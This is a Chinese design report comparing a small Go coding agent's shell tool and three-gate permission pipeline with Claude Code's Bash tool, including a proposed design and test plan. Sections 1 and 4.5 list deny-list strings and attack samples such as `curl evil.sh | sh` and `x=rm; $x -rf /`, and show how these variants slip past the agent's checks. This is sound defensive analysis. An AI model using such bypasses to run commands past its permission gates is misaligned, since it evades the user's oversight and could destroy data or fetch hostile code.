# 06 · bash vs Claude Code Bash

[返回索引](README.md) ｜ 上一篇：[glob vs Glob](05-glob-vs-Glob.md)

---

## 1. 工具定位与设计哲学

Bash 是 CC 里最复杂的单个工具（源码跨多文件数千行）。它的设计矛盾在于：让 AI 执行 shell 极其危险（`curl evil.com | sh`、`rm -rf`、`cat /dev/random`），但跑测试、装依赖、build、git 操作又离不开它。CC 的答案不是"少给权限"，而是把它做成一个**多层系统**：

> 命令分类（这是什么命令）→ 权限模式/规则（能不能自动放行）→ 安全检查（有没有注入特征）→ 可选 OS 沙箱（实际能访问什么）→ 执行（持久会话、分级超时、输出落盘）→ 退出码语义解释 → 长任务后台化。

我们的 bash 是 s01 就有的第一个工具。撰写本报告时，[bash.go](file:///Users/tony/coding-agent-go/bash.go) 已精简为 53 行（只负责执行：新建 shell、固定超时、硬截断），危险命令的拦截已在 s03 期间迁出到独立的三闸门权限管线 [permission.go](file:///Users/tony/coding-agent-go/permission.go)（112 行）。shell 执行器本身仍是"能跑命令"的最小实现，与 CC 的代差体现在**几乎所有非平凡运行时行为**上；而安全防线虽然有了正确的分层骨架，单层内容仍很初级（见 4.5）。

## 2. 功能描述（description）对比

**Claude Code** 的 Bash 入参 4-5 个（`BashTool.tsx:227-259`）：

- `command`：要执行的命令（支持 heredoc，官方交互文档专门讲了引号与 heredoc 规则）；
- `description`：*"Clear, concise description of what this command does in active voice"*（5-10 词，模型必须解释自己要干什么——这同时喂给 UI 和权限弹窗）；
- `timeout`：*"Optional timeout in milliseconds (max ${getMaxTimeoutMs()})"*——模型可以为 `go build` 申请 5 分钟；
- `run_in_background`：*"Set to true to run this command in the background ..."*；
- `dangerouslyDisableSandbox`：显式逃逸沙箱（仍受策略约束）。

**系统行为提示**（官方文档）：cwd 在命令间持久；输出超 30K 字符截断但全文落盘，可 Read；默认 120s、最大 600s；read-only 命令集合自动免确认。

**我们**（[tools.go L357-359](file:///Users/tony/coding-agent-go/tools.go#L357-L359)）：

```go
tool("bash", "Run a shell command.",
    map[string]any{"command": map[string]string{"type": "string"}},
    []string{"command"})
```

模型不知道：cwd 会不会保留（不会）、超时多久（120s）、输出太多会怎样（丢）、能不能跑后台（不能）。真实试玩中已观察到后果：模型在任务 4 的几乎**每条命令都加了 `cd /Users/tony/coding-agent-go &&` 前缀**（见本会话试玩记录）——它在不知情的情况下很快学到了"cwd 不保留"，额外的 35 字符 × 多条命令是纯浪费，且容易在拼接多段命令时出错。

## 3. API/Schema 逐项对比

| 参数 | Claude Code Bash | 我们 |
|---|---|---|
| `command` | 必填 | 必填（唯一参数） |
| `description` | 可选但鼓励（主动语态说明） | 无 |
| `timeout` | 毫秒，默认 120 000，**最大 600 000** | 无（固定 120s，[bash.go L14](file:///Users/tony/coding-agent-go/bash.go#L14)） |
| `run_in_background` | 布尔 | 无 |
| `dangerouslyDisableSandbox` | 布尔（受限于配置） | 无沙箱可关 |

## 4. 执行机制对比（源码级）

### 4.1 持久 shell 会话 vs 每次新 sh

- **CC**：维护 shell 会话，**cwd（以及 shell 级状态）在工具调用间保留**，模型 `cd web && npm test` 的下一条命令仍在 web/。官方"What persists between commands"明确 cwd 持久。
- **我们**：每次调用 `exec.CommandContext(ctx, "sh", "-c", command)`（[bash.go L26-31](file:///Users/tony/coding-agent-go/bash.go#L26-L31)），进程结束状态全失，cwd 不持久（真实试玩已复现，见第 7 节场景 D）。

### 4.2 三级超时与后台任务

CC（`BashTool/prompt.ts:27-33` 及官方文档）：

| 层级 | 阈值 | 行为 |
|---|---|---|
| 默认前台 | 120 000 ms（`BASH_DEFAULT_TIMEOUT_MS`） | 一般命令 |
| 最大前台 | 600 000 ms（10 分钟） | 模型用 `timeout` 参数主动申请 |
| 后台 | `run_in_background:true` 或阻塞超 budget 自动转后台（源码 v0.2.x：Assistant 模式 15s `ASSISTANT_BLOCKING_BUDGET_MS`，PROGRESS_THRESHOLD 2s） | 立即返回 taskId；输出写文件；完成系统通知；TaskStop 可杀；可续期 |

- 我们：120s context deadline 一到即返回 `Error: Timeout (120s)`（[bash.go L38-40](file:///Users/tony/coding-agent-go/bash.go#L38-L40)），进程被杀，**没有"再等等"的选项**。`go build -race`、`npm install` 类命令在我们这里几乎注定失败且无逃生路径。

**版本说明**："2 分钟自动转后台"见于 v2.1.x 官方文档（foreground commands that move to the background）；15s 是 v0.2.x 源码 Assistant 模式阈值，二者可能已调整，报告以官方 v2.1 的 120s/600s/后台模型为准。

### 4.3 输出上限：落盘保全 vs 硬截断丢弃

- **CC**：`BASH_MAX_OUTPUT_LENGTH` 默认 **30 000** 字符、最大可配 150 000（[官方环境变量文档](https://code.claude.com/docs/en/env-vars)）。超限时结果中给截断提示 + **完整输出所在文件路径**，模型下一步用 Read 分页读全文（TaskOutput 工具在 v2.1.277 移除后，官方明确改为用 Read 读后台任务输出文件——工具间组合协议）。
- **我们**：50 000 rune 超出部分直接砍掉（[bash.go L49-51](file:///Users/tony/coding-agent-go/bash.go#L49-L51)），无落盘、无路径、无法找回。测试日志/build 日志超过 50K rune 时，关键错误信息常出现在尾部——而尾部恰好是被丢弃的部分。

### 4.4 命令语义：分类器与退出码解释

CC 的分类不是"第一个词"匹配，而是**管道全段判定**（`BashTool.tsx:60-172`）：

- 集合定义：search（find/grep/rg/ag/ack/locate/which/whereis）、read（cat/head/tail/less/wc/stat/file/jq/awk/cut/sort/uniq/tr…）、list（ls/tree/du）、**语义中性**（echo/printf/true/false/:，在管道任何位置都不改变读/写性质，所以 `ls a && echo "---" && ls b` 仍是只读）、silent（mv/cp/rm/chmod/cd/export…）。
- 管道要**所有段**都是 search/read 才判只读——`cat f | sh` 不会因为第一段是 cat 就放行。
- 用途：read-only 命令在权限系统里自动免确认；也用于 UI 呈现。

**退出码语义表**（`commandSemantics.ts:31-89`）：

| 命令 | 退出码 0 | 退出码 1 | ≥2 |
|---|---|---|---|
| grep / rg | 有匹配 | **No matches found（不是错误）** | 错误 |
| diff | 无差异 | Files differ（不是错误） | 错误 |
| test / `[` | 条件真 | 条件假（不是错误） | 错误 |

我们：`cmd.Run()` 任何非零 error 都返回 `"Error: " + err.Error()`（[bash.go L41-43](file:///Users/tony/coding-agent-go/bash.go#L41-L43)）。**`grep` 无匹配（退出 1）被报成错误**——模型会以为命令失败，触发无谓的重试或换方案；`diff`/`test` 同理。

### 4.5 安全：CC 多层防线 vs s03 三闸门管线

**CC 的层次**：

1. **权限模式 + 规则**：Manual/Aero/auto 等模式；`Bash(npm run *)` 形式的命令模式 allow/deny；只读命令白名单自动放行；执行前弹窗/分类器决策。
2. **bashSecurity.ts 的 23 项检查**（数字 ID，避免日志记录敏感字符串），覆盖面（`bashSecurity.ts:16-101`）：
   - 命令替换/注入：`$()`、`${}`、`$[]`、进程替换 `<()` `>()`、zsh `=cmd` 展开（`=curl x` 会展开成 `/usr/bin/curl x` 绕过命令名规则）、IFS 注入、引号脱同步、带引号换行、反斜杠转义空白/操作符、花括号展开、控制字符、Unicode 空白、词中井号；
   - jq 系统函数/文件参数、混淆 flags、shell 元字符、危险变量、输入/输出重定向模式；
   - zsh 危险内建：zmodload（可加载 zsh/system 绕权限、zsh/zpty 执行、zsh/net/tcp 外联）、emulate、zpty、ztcp、zsocket、zf_rm/zf_mv 等。
3. **破坏性命令警告**（信息性，不阻断决策但在确认框提示）：`git push --force`（正则还特意排除不了 dry-run 语义）、`git clean -f`（`-n/--dry-run` 例外）、`rm -rf`、`DROP/TRUNCATE TABLE`、`kubectl delete`、`terraform destroy`（`destructiveCommandWarning.ts:12-89`）。
4. **可选 OS 沙箱**：文件读域、文件写域、网络域分别授权；sandbox-exec/seatbelt 类机制；四条绕过路径（全局关、显式 disable 且策略允许、用户排除命令等）经 `shouldUseSandbox` 定点收敛；沙箱状态还会**注入系统提示**（省 150-200 token 的去重后路径清单）。

**我们（s03 已落地，三闸门管线）**：安全检查已从 bash.go 迁出，在工具分发**之前**统一执行——[agent.go L40-44](file:///Users/tony/coding-agent-go/agent.go#L40-L44) 对**所有工具**调用 `checkPermission`，拒绝时把 `"Permission denied."` 作为错误 tool_result 回灌模型（模型能据此调整行为，这是相对早期"直接硬挡"的一个进步）。三闸门定义在 [permission.go](file:///Users/tony/coding-agent-go/permission.go)：

1. **Gate 1 硬拒清单**（[checkDenyList L17-24](file:///Users/tony/coding-agent-go/permission.go#L17-L24)，仅 bash）：[denyList L14](file:///Users/tony/coding-agent-go/permission.go#L14) 7 个子串 `rm -rf /`、`sudo`、`shutdown`、`reboot`、`mkfs`、`dd if=`、`> /dev/`，命中即拒（[L96-105](file:///Users/tony/coding-agent-go/permission.go#L96-L105)），无放行通道。
2. **Gate 2 规则匹配**（[permissionRules L52-64](file:///Users/tony/coding-agent-go/permission.go#L52-L64)）：当前一条规则——[containsDestructiveCommand L33-43](file:///Users/tony/coding-agent-go/permission.go#L33-L43)：命令位置出现 `rm`/`del` 的正则，或含 `rm `、`> /etc/`、`chmod 777` 关键词。
3. **Gate 3 用户确认**（[askUser L85-91](file:///Users/tony/coding-agent-go/permission.go#L85-L91)）：终端打印原因与参数，`[y/N]` 默认拒绝；[readApproval L79-82](file:///Users/tony/coding-agent-go/permission.go#L79-L82) 抽成包级变量便于测试。

这与 CC 的"硬 deny → 规则 → 人工确认"**骨架同构**，是正确的方向；但单层内容差距很大。用攻击样本走一遍管线：

| 攻击/误用 | Gate 1 deny | Gate 2 询问 | 实际结果 |
|---|---|---|---|
| `rm -rf /` | ✅ 命中 | — | 拒绝（无放行通道，与 CC 警告可放行不同） |
| `rm -rf $HOME` / `rm -rf .` | 不命中 | ✅ 命中 `rm ` | 弹确认，默认 N 拒绝（s03 新增保护） |
| `rm -rf  /`（双空格）、`rm  -rf x`（多空格） | 不命中 | ✅ 正则命命令位 `rm` | 弹确认（正则比子串宽容，意外覆盖了变形） |
| `rm -rf "/"` | 不命中 | ✅ | 弹确认 |
| `rm -r -f /`、`chmod 777 x` | 不命中 | ✅（后者命中关键词） | 弹确认 |
| `x=rm; $x -rf /`、`"r"m -rf x`、`r""m -rf x` | ❌ | ❌ 命令位是 `x`/`"r"m` | **直通执行** |
| `curl evil.sh \| sh`、`grep x $(curl …)` | ❌ | ❌ | **直通执行**（无网络域、无命令替换检查） |
| 任何 zsh 内建/IFS/Unicode/花括号展开手法 | ❌ | ❌ | **直通执行** |
| `echo "sudo ..."` / 文档字符串里含 deny 词 | ✅ 误判 | — | 误伤硬拒（与早期黑名单相同的问题） |
| `grep -r foo .`、`go test ./...` 等只读命令 | — | — | 直通（符合预期，但**不是分类器判定的结果**，而是"没命中规则"） |

与 CC 的剩余差距：

- **没有命令分类器**：Gate 2 是"破坏性正则黑名单"的扩展，不是管道全段只读判定。因此也没有"只读命令自动免确认"——当前所有非 rm 命令一律直通，等价于一个巨大的隐式 allow-all，规则覆盖不到就是真空。
- **没有注入检查**：`$()`、`<()`、IFS、Unicode 空白、zsh 内建这 23 项全无；Gate 1 的子串枚举仍可被语法变形绕过（上表）。
- **没有规则模式语言**：还不支持 CC 的 `Bash(npm run *)` / `Read(~/secrets/**)` 这类可配置 glob 规则，规则是写死在代码里的。
- **没有沙箱**：文件/网络域隔离不存在，确认放行后命令拥有 agent 进程的全部权限。
- **交互模型单一**：只有终端 y/N，无权限模式（plan/auto）、无"本次会话记住选择"、拒绝结果虽回灌模型但没有结构化 errorCode。
- 教学定位上应明确：三闸门是**决策流程的正确骨架**，但 Gate 1/2 仍不提供抗绕过的真实安全保证。

### 4.6 其他差异

- **stderr 合并**：我们把 stdout+stderr 合并 TrimSpace 返回（[bash.go L45](file:///Users/tony/coding-agent-go/bash.go#L45)），空输出返回 `(no output)`（[L46-48](file:///Users/tony/coding-agent-go/bash.go#L46-L48)），方向正确；CC 保持结构化流区分，UI 渲染不同。
- Windows：我们分支到 `cmd /C`（[L27-29](file:///Users/tony/coding-agent-go/bash.go#L27-L29)）；CC v2.x 提供独立 PowerShell 工具处理编码/退出码差异。

## 5. 输出契约与边界行为

| 场景 | Claude Code | 我们 |
|---|---|---|
| 正常输出 | 文本（上限 30K，可配至 150K） | stdout+stderr，50K rune 截断 |
| 超上限 | 截断 + 全文落盘路径（Read 取回） | 超出永久丢失 |
| 无输出 | 空 | `(no output)` |
| grep/rg 退出 1 | "No matches found"，非错误 | `Error: exit status 1` |
| 超时 | 可申请至 600s / 自动后台 | 固定 120s 报错 |
| 长任务 | taskId + 文件 + 完成通知 + TaskStop | 不支持 |
| 危险操作 | 分类→规则→23 项检查→沙箱→警告 | 三闸门：deny 硬拒/rm 类询问/其余直通（见 4.5） |
| cwd | 跨调用持久 | 不持久 |
| 命令意图 | description 必填式说明 | 无 |

## 6. 状态、安全与权限

CC Bash 的状态面：持久 shell 会话（cwd/会话）、后台任务注册表（taskId→进程/输出文件/状态）、权限规则集、沙箱配置。这四类状态共同支撑第 4 节行为。

我们的 [runBash](file:///Users/tony/coding-agent-go/bash.go#L18-L20) 仍是纯函数式调用，无任何会话状态；但决策上下文已经有了第一个落点——s03 的 [checkPermission](file:///Users/tony/coding-agent-go/permission.go#L94-L112) 在 [agent.go L40](file:///Users/tony/coding-agent-go/agent.go#L40) 分发前统一拦截，且 `permissionRule.check` 已接收完整工具参数 JSON（[permission.go L46-50](file:///Users/tony/coding-agent-go/permission.go#L46-L50)），扩展为规则集/分类器不需要改调用点。下一步建议：规则格式对齐 `Bash(command-pattern)`，用"管道全段分类器 + 规则模式匹配"替代 Gate 2 的写死正则，并把 Gate 1 的子串 deny 降级为更大检查集（注入检测）中的一项。

## 7. 效果对比（量化场景推演，估算）

### 场景 A：`go test ./...` 失败，测试日志 80K 字符，真正的失败在最后 30 行

- **CC**：30K 截断 + 落盘路径；模型立刻 Read 输出文件的**尾部**（offset/分页）拿到 FAIL 汇总，2 次工具调用定位问题。
- **我们**：前 50K rune（大概率是前面包的 PASS 日志）返回，尾部失败信息被丢；模型只能换法重跑（`go test ./... 2>&1 | tail -50`）——多一轮，且模型要自己悟出"关键信息在尾部"。真实项目中这是高频路径。

### 场景 B：无匹配的 grep 被当成失败

- **CC**：退出码 1 语义化为"No matches found"，模型据此做正确的否定推理（"这个符号没人用，可以安全删除"）。
- **我们**：`Error: exit status 1` → 模型可能判断命令出错而重跑、换 pattern，甚至误报"搜索失败无法确认"。一次本应 1 轮完成的否定确认变成 2-3 轮。

### 场景 C：大型构建 `go build -race ./...` 耗时 180s

- **CC**：模型给 timeout=300000（或自动后台），拿到结果；后台时还能先处理别的，完成通知回来再继续。
- **我们**：120s 必挂 `Error: Timeout (120s)`，任务在当前架构无解（除非改用 nohup 自造后台，但输出管理/完成检测全要模型自己拼 shell）。

### 场景 D：多步任务"进入子目录操作、下一步继续在该目录"

- **CC**：`cd web && npm install`，下一条 `npm run build` 直接生效。
- **我们**：每条命令都要重写 `cd /abs/path && ...`。本次真实试玩 4 个任务里，模型在任务 4 的 4 条 bash 命令**全部**带了绝对路径 cd 前缀（约 35 字符/条），这是模型为我们的架构缺陷支付的持续税；多段命令拼接也更容易出现 `cd a && cd b` 类错误。

### 场景 E：安全对抗

s03 三闸门把"直接执行"升级为"硬拒 → 询问 → 直通"，对最常见的误用（手滑 `rm -rf` 到根、普通 `rm` 操作）已经有效。但根本问题没变：Gate 1/2 仍试图用字符串/正则枚举解决**语法问题**——shell 是可组合语言，命令名、空白、展开、替换、编码都能变形（`x=rm; $x …`、引号分割、命令替换），而询问门对非交互/自动运行场景默认就是拒绝或真空直通。23 项检查 + 沙箱 + 分类器自动放行才是与之匹配的防御粒度。现状应在文档中明确"教学用途：挡住诚实的误操作，不防刻意绕过"。

## 8. 差距清单评级

| 维度 | Claude Code | 我们 | 影响 | 优先级 |
|---|---|---|---|---|
| cwd 持久 | 持久会话 | 每次新 sh | 每条命令重复 cd（已实测） | **P0** |
| 退出码语义 | grep/diff/test 退出 1 非错误 | 一律 Error | 否定推理失败、无谓重试 | **P0** |
| 输出落盘 | 超限落盘 + 路径 | 硬截断丢弃 | 尾部关键信息丢失（高频） | **P0** |
| timeout 参数 | ≤600s 可申请 | 固定 120s | 慢命令无解 | **P1** |
| 命令分类器 | 管道全段只读判定 | 无（Gate 2 仅 rm/del 正则） | 只读自动放行的基础；当前非规则命令隐式 allow-all | **P1** |
| 权限门 | 模式 + 规则 + 弹窗 | ✅ s03 三闸门已落地（[permission.go](file:///Users/tony/coding-agent-go/permission.go)） | 骨架已对；规则写死、无模式语言、无模式切换 | 已初版 / P1 深化 |
| 注入检查 | 23 项 | 无（Gate 1 仅 7 子串 deny） | 可枚举绕过 | P1 |
| 后台任务 | taskId/文件/通知/停止 | 无 | agent loop 被阻塞 | P2（里程碑 C） |
| OS 沙箱 | 读写/网络域 | 无 | 最强隔离层 | P2（远期） |
| description 字段 | 显式意图说明 | 无 | 审计/审批信息少 | P2 |

## 9. 对齐设计草案（仅设计，不实施）

按依赖拆为三段，可分别落地。

### 第一段（纯 Go，里程碑 B）：会话、语义、落盘

```go
// 1) 持久 cwd：两种实现深度
//    轻量：sessionState 记录 shellCwd，每条命令包成 "cd <shellCwd> && { ... }"，
//          并用正则从输出/单独 pwd 同步（脆弱，仅过渡）
//    正统：维护常驻 shell 进程（pty/pipe：写 "cd x\n pwd marker\n"），
//          解析 marker 同步 cwd；工作量大但行为真实
func (s *shellSession) Run(command string, timeout time.Duration) *bashResult

type bashResult struct {
    Stdout, Stderr string
    ExitCode       int
    SemanticNote   string // "No matches found" 等
    OverflowFile   string // 超限时全文落盘路径
}

// 2) 退出码语义表（抄 commandSemantics 的最小集）
var exitCodeSemantics = map[string]func(int) (isError bool, note string){
    "grep": semNoMatch1, "rg": semNoMatch1, "diff": semDiffer1, "test": semFalse1,
}
// 管道取最后一个命令名判定（与"全段只读判定"是两套用途）

// 3) 输出落盘：超 30K（常量可调）→ 写到 workdir 外的会话临时目录或 .agent-bash/ 下，
//    结果文本："...truncated. Full output saved to <path> (read it with read_file)"
```

Schema 增加 `timeout`（毫秒，clamp 到 [0, 600000]，默认 120000）。

### 第二段：在现有 permission.go 之上深化（三闸门已就位）

s03 已提供可复用的接缝：`permissionRule{tools, check, message}`（[permission.go L46-50](file:///Users/tony/coding-agent-go/permission.go#L46-L50)）+ Gate 3 的 askUser，扩展时不动 agent.go 调用点。

- 实现 `classifyCommand(command) commandClass`：split 管道/`&&`/`;`，每段按命令集合归类，中性命令跳过；**全段只读才判只读**。只读结果接一条"自动放行规则"，排在破坏性规则之前。
- 规则模式语言：把写死的单条规则升级为可配置列表，支持 `Bash(npm run *)`/`Read(glob)` 形式（pattern 匹配复用分类器先剥 `FOO=bar`/`timeout N` 前缀，CC 用不动点迭代处理交错前缀）；区分 allow / ask / deny 三类决策而非现在的二元。
- Gate 1 扩展为注入检查集：先补命令替换 `$()`、进程替换 `<()`、IFS、反引号、控制字符/Unicode 空白等高价值检测（对应 CC 23 项的子集），子串 deny 清单保留为其中最粗的一层。
- 破坏性命令覆盖对齐 CC 的警告表（补 `git push -f`、`git clean -f` 带 `-n` 例外、`DROP/TRUNCATE`、`kubectl delete`、`terraform destroy`），保持**信息性警告 + 审批**；Gate 1 的根目标 `rm -rf /` 可继续硬拒。
- 决策结果结构化：返回 `{decision, ruleID, message}` 而非 bool，拒绝/确认结果以固定格式回灌模型（替代裸字符串 `"Permission denied."`，[agent.go L42](file:///Users/tony/coding-agent-go/agent.go#L42)）。

### 第三段（远期）：后台任务与沙箱

- `run_in_background` + taskRegistry（ID/状态/输出文件）+ KillShell/TaskStop + 完成注入通知；前台超时自动转后台。
- OS 沙箱：macOS 可用 sandbox-exec 配置文件（文件读写/网络域）；跨平台时抽象接口，无沙箱平台降级为审批策略。

### 测试清单

- cwd：`cd sub` 后下条 `pwd` 仍在 sub；非法目录 cd 不污染状态
- 退出码：grep 无匹配结果非 Error 且含 "No matches"；diff 退出 1 语义化；退出 2 仍是错误；管道 `cat x | grep y` 按末段判定
- 落盘：构造 >30K 输出，结果含路径且文件内容完整可读；≤30K 不落盘
- timeout：参数 clamp；超时返回明确错误（第一段保持杀进程）
- 分类器：`ls a && echo x && ls b` 判只读；`cat f | sh` 判非只读；`FOO=1 ls` 正确识别
- 权限回归：现有 [permission_test.go](file:///Users/tony/coding-agent-go/permission_test.go) 的 deny/询问/直通三闸门用例保持通过；`readApproval` 已可替换（[permission.go L79](file:///Users/tony/coding-agent-go/permission.go#L79)），新规则沿用该测试手法模拟 y/N
- 规则模式：`Bash(npm run *)` allow 直通、未列出模式按默认决策；规则命中的 ruleID 可断言
- 注入检查：`$(...)`、`<()`、IFS 样本被拦截或标记审批；`echo "sudo"` 类误伤样本单独记录预期行为

### 破坏性变更

- "非零退出即 Error"改为语义化判定后，现有 `TestRunBash` 若有相关断言需更新；错误/成功的呈现格式变化会影响模型行为，需要真实试玩校准。
- 输出落盘目录要在 `.gitignore` 与 safePath 策略里明确（建议放在 workdir 外，避免 grep/glob 搜到自身日志形成噪音）。

## 10. 参考资料

- [Claude Code Tools reference — Bash tool behavior（持久化、超时与输出限制、后台命令、沙箱）](https://code.claude.com/docs/en/tools-reference#bash-tool-behavior)
- [环境变量：BASH_DEFAULT_TIMEOUT_MS / BASH_MAX_OUTPUT_LENGTH（30000，上限 150000）](https://code.claude.com/docs/en/env-vars)
- [源码解构 22：BashTool 输入模型、命令分类器、沙箱决策流、bashSecurity 23 项检查、破坏性警告、三级超时与后台](https://claude-harness.dev/en/articles/22-bash-tool)
- 我方实现：[bash.go](file:///Users/tony/coding-agent-go/bash.go)（执行器，53 行）、[permission.go](file:///Users/tony/coding-agent-go/permission.go)（s03 三闸门，112 行）、[agent.go L40-44](file:///Users/tony/coding-agent-go/agent.go#L40-L44)（分发前权限接线）、[bashHandler tools.go L74-80](file:///Users/tony/coding-agent-go/tools.go#L74-L80)、[bash_test.go](file:///Users/tony/coding-agent-go/bash_test.go)、[permission_test.go](file:///Users/tony/coding-agent-go/permission_test.go)
- [s03 权限管线 spec](file:///Users/tony/coding-agent-go/.trae/specs/add-permission-pipeline/spec.md)
